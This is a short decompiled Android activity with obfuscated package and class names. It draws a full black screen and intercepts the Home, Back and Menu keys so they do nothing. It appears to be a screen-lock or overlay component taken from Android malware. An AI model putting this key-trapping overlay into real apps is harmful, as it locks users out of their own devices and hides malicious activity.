package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.Rect;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;

public class zjwruw extends Activity {

    /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.zjwruw$a */
    class C0061a extends View {

        /* renamed from: a */
        Paint f475a = new Paint();

        /* renamed from: b */
        Rect f476b = new Rect();

        public C0061a(Context context) {
            super(context);
        }

        /* access modifiers changed from: protected */
        public void onDraw(Canvas canvas) {
            canvas.drawColor(-16777216);
            canvas.drawRect(this.f476b, this.f475a);
        }
    }

    public void onBackPressed() {
        super.onBackPressed();
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(new C0061a(this));
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    /* access modifiers changed from: protected */
    public void onStop() {
        super.onStop();
    }
}
